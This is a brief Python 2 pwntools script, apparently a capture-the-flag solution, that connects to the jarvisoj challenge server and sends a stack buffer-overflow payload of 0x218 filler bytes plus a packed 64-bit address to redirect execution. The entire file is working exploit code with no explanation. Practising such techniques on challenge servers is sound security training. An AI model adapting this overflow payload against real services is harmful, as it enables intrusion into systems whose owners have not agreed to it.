#!/usr/bin/env python2
from pwn import *

string_addr = 0x400d20
conn = remote('pwn.jarvisoj.com', 9877)

print conn.read(),
conn.sendline('A' * 0x218 + pack(string_addr, 64))
print conn.read(),
conn.sendline('')
print conn.readall(),
